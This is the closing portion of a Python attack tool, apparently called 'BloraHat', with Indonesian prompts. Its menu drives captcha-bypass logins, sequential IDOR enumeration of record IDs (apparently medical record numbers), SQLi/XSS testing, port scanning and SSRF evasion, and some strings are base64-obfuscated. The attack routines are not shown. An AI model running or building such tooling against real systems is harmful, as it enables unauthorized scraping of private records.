    print(f"\n" + "-"*85)
    print(f"{' '*32}\033[1m{_decode('RVZBU0lPTiBSRVBPUlQ=')}\033[0m")
    print("-"*85)
    print(f"{'Vulnerability Found':<25} | {'Severity':<10} | {'Location'}")
    print("-"*85)
    if not findings: print(f"{' '*30}Audit selesai. Tidak ditemukan celah.")
    else:
        for f in findings: print(f"{f['type']:<25} | {f['severity']:<10} | {f['loc'][:40]}")
    print("-"*85)
    print(f"[*] Total Vulnerabilities Found : {len(findings)}")
    print(f"[*] Fix Suggestion              : Validasi Host Header, Filter URL Params, & Encrypt Client IPs")
    print("="*85 + "\n")

def start_process(id_list):
    global total_checked, total_to_scan
    total_checked = 0
    total_to_scan = len(id_list)
    if login():
        print(f"[*] Starting IDOR Scan for {total_to_scan} records (Sequential)...\n")
        with ThreadPoolExecutor(max_workers=int(_decode("Mg=="))) as executor:
            executor.map(fetch_data, id_list)
        print("\n[*] IDOR Audit Completed. Data displayed in terminal.")
    else:
        print("[\033[91m!\033[0m] Gagal Login: Periksa kredensial atau Captcha.")

def main_menu():
    while True:
        clear()
        show_banner()
        print(" [1] Auth Test (Captcha Bypass Testing)")
        print(" [2] IDOR Scan (Input Jumlah Data)")
        print(" [3] Security Config Audit (Headers & Files)")
        print(" [4] Parameter Discovery (URL Tampering Scan)")
        print(" [5] Vulnerability Scan (SQLi & XSS Testing)")
        print(" [6] Infrastructure Audit (Port Scan & Service Mapping)")
        print(" [7] Advanced Evasion (SSRF, Cache Poisoning, IP Masking)")
        print(" [0] Exit")
        print("\n")
        
        choice = input(" BloraHat > ")

        if choice == '1':
            login()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '2':
            try:
                count = int(input("[?] Jumlah data yang ingin di scan: "))
                BASE_ID = int(NO_RM)
                # Membuat list ID secara urut (Sequential)
                id_pool = list(range(BASE_ID, BASE_ID + count))
                # random.shuffle(id_pool) <-- Baris ini dinonaktifkan
                start_process(id_pool)
            except ValueError:
                print("[\033[91m!\033[0m] Error: Input harus berupa angka.")
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '3':
            if login():
                audit_security_config()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '4':
            if login():
                parameter_discovery_audit()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '5':
            if login():
                vulnerability_audit()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '6':
            if login():
                infrastructure_audit()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '7':
            if login():
                advanced_evasion_audit()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '0':
            print("Happy Auditing!")
            sys.exit()
        else:
            print("Pilihan tidak valid.")
            input("Tekan Enter untuk mencoba lagi...")

if __name__ == "__main__":
    main_menu()
